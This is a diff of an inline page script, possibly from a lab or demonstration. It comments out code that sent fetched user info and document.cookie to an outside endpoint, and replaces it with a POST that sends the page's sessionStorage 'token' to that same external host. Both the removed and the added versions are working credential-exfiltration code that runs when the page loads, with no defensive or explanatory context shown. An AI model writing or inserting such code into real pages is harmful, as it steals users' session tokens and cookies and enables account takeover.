@@ -10,25 +10,25 @@
 			});
 
 			let body = {};
-			try {
-				const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
-					method: 'GET'
-				});
-				const data = await res.json();
+			// try {
+			// 	const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
+			// 		method: 'GET'
+			// 	});
+			// 	const data = await res.json();
 
-				body = {
-					userInfo: data,
-					cookies: document.cookie
-				}
-			} catch (e) {
-				body = {
-					error: e.message
-				}
-			}
+			// 	body = {
+			// 		userInfo: data,
+			// 		cookies: document.cookie
+			// 	}
+			// } catch (e) {
+			// 	body = {
+			// 		error: e.message
+			// 	}
+			// }
 
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
-				body: JSON.stringify(body),
+				body: sessionStorage.getItem('token'),
 			});
 		})();
     </script>
